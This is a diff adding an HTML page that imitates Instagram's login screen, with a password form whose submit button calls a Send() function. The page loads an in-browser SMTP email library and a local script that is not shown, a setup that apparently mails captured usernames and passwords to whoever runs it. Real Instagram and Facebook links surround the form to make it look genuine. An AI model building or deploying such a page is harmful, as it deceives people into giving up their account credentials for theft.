@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/pngwing.com(2).png">
+  <link rel="stylesheet" href="style.css">
+  <title>Instagram</title>
+</head>
+
+<body>
+  <main>
+    <div class="phone_frame">
+      <img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/home-phones.png" alt="">
+    </div>
+    <div id="image-container">
+      <img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/instagram-ph-1.png" alt="Image 1" class="image-active">
+      <img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/instagram-ph-2.png" alt="Image 2">
+      <img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/instagram-ph-3.png" alt="Image 3">
+      <img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/instagram-ph-4.png" alt="Image 4">
+    </div>
+    <div class="login_home">
+      <form>
+        <div class="input-container">
+          <input type="text" required id="Name">
+          <label for="text">Phone number, username, or email</label>
+        </div>
+        <div class="password-container">
+          <input type="password" required id="password">
+          <label for="password">password</label>
+        </div>
+        <div class="loginme">
+          <button type="submit" id="loginButton" onclick="Send()">Log in</button>
+        </div>
+      </form>
+      <div class="orbutton">
+        <hr>
+        <div class="oroption">Or</div>
+        <hr>
+      </div>
+      <div class="withfacebook">
+        <div class="ficons">
+          <a href="https://www.facebook.com/login"><img src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/facebook.png" alt="facebook"></a>
+        </div>
+        <a href="https://www.facebook.com/login">
+          <div class="latterfa">Log in with Facebook</div>
+        </a>
+      </div>
+      <div class="forgetpassword">
+        <div><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></div>
+      </div>
+    </div>
+    <div class="forgetpass">
+      <div class="insidepass">
+        <span>Don't have an account? </span><span><a href="https://www.instagram.com/accounts/emailsignup/">Sign
+            up</a></span>
+      </div>
+    </div>
+    <div class="getapp">
+      <div class="getapptext">Get the app.</div>
+      <div class="getappimg">
+        <div><a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&gl=US"><img
+              class="img1" src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/googleplaystore.png" alt=""></a>
+        </div>
+        <div><a href="https://apps.apple.com/in/app/instagram/id389801252"><img class="img2"
+              src="https://adityacloud.nyc3.cdn.digitaloceanspaces.com/ms-store.png" alt=""></a></div>
+      </div>
+    </div>
+  </main>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="script.js"></script>
+</body>
+
+</html>
